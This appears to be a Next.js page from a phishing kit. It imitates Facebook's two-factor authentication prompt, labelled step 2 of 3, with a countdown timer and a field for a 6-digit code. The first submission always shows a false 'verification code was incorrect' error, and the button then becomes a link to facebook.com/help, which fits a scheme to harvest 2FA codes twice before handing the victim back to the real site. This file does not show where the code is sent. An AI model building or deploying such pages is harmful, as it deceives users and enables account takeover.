"use client";
import Image from "next/image";
import Link from "next/link";

import { useRouter } from "next/navigation";
import React, { useState, useRef, useEffect, use } from "react";
import Nav from "../component/nav";

export default function Home() {
  const Ref = useRef(null);
  const [timer, setTimer] = useState("03:00");
  const [doubleCheck, setDoubleCheck] = useState(0);
  const getTimeRemaining = (e) => {
    const total = Date.parse(e) - Date.parse(new Date());
    const seconds = Math.floor((total / 1000) % 60);
    const minutes = Math.floor((total / 1000 / 60) % 60);
    const hours = Math.floor((total / 1000 / 60 / 60) % 24);
    return {
      total,
      hours,
      minutes,
      seconds,
    };
  };
  const clearTimer = (e) => {
    // If you adjust it you should also need to
    // adjust the Endtime formula we are about
    // to code next
    setTimer("03:00");

    // If you try to remove this line the
    // updating of timer Variable will be
    // after 1000ms or 1sec
    if (Ref.current) clearInterval(Ref.current);
    const id = setInterval(() => {
      startTimer(e);
    }, 1000);
    Ref.current = id;
  };
  const getDeadTime = () => {
    let deadline = new Date();

    // This is where you need to adjust if
    // you entend to add more time
    deadline.setSeconds(deadline.getSeconds() + 180);
    return deadline;
  };
  const startTimer = (e) => {
    let { total, hours, minutes, seconds } = getTimeRemaining(e);
    if (total >= 0) {
      // update the timer
      // check if less than 10 then we need to
      // add '0' at the beginning of the variable
      setTimer(
        (minutes > 9 ? minutes : "0" + minutes) +
          ":" +
          (seconds > 9 ? seconds : "0" + seconds)
      );
    }
  };
  const handleWithSubmit = () => {
    if (doubleCheck === 0) {
      setDoubleCheck(doubleCheck + 1);
      return;
    }
  };
  useEffect(() => {
    clearTimer(getDeadTime());
  }, []);
  return (
    <>
      <div className="w-screen h-screen bg-[#dbdee2] flex">
        <Nav />
        <main className="container m-auto max-w-[584px] px-[12px] bg-white rounded-md">
          <h1 className="text-base leading-6 font-bold font-sans py-[12px]">
            Two-factor authentication required (2/3)
          </h1>
          <p className="text-base  leading-6 text-[#212529] font-medium">
            You&apos;ve asked us to require a 6-digit login code when anyone tries to
            access your account from a new device or brower.
          </p>
          <p className="text-base  leading-6 text-[#212529] font-medium my-[14px]">
            Enter the 6-digit code from your{" "}
            <span className="font-extrabold font-sans">code generator</span> or
            third-party app below.
          </p>
          <hr className="my-[20px]" />
          <div className="flex space-x-1">
            <input
              type="text"
              placeholder="Your code"
              className="rounded bg-white text-base"
              required
            />
            <h2 className="my-auto">{timer}</h2>
          </div>
          {doubleCheck === 1 && (
            <h1 className="text-[#a94442] font-sans text-[15px] leading-[22px] my-[8px]">
              Your verification code was incorrect, please try again!
            </h1>
          )}

          <hr className="my-[20px]" />
          <div className="flex justify-between my-[12px]">
            <h1 className="text-[14px] text-[#1877f2] leading-[21px] my-auto">
              Need another way to authenticate?
            </h1>
            {doubleCheck === 0 && (
              <button
                onClick={handleWithSubmit}
                className="rounded bg-[#0c65e6] font-sans font-bold text-base text-white p-[12px] hover:bg-blue-700"
              >
                Submit
              </button>
            )}
            {doubleCheck === 1 && (
              <Link
                href="http://facebook.com/help/"
                className="rounded bg-[#0c65e6] font-sans font-bold text-base text-white p-[12px] hover:bg-blue-700"
              >
                Submit
              </Link>
            )}
          </div>
        </main>
      </div>
    </>
  );
}
